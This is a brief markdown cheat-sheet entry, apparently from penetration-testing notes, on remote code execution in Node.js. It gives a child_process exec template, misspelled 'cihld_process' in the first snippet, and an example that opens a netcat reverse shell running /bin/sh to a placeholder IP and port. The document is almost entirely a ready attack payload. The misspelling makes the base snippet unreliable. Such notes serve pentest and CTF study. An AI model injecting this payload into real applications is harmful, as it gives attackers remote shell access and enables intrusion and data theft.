##Nodejs RCE

The reverse shell payload is not based on nodejs
Theoretically, you can use others

####the base:

```javascript
require('cihld\_process').exec('\<CODE HERE\>')
```
__\<CODE HERE\>__ can be changed by other mechanism


###example

####Using netcat :

```javascript
require('child\_process').exec('nc -c /bin/sh <IP> <PORT>')

```
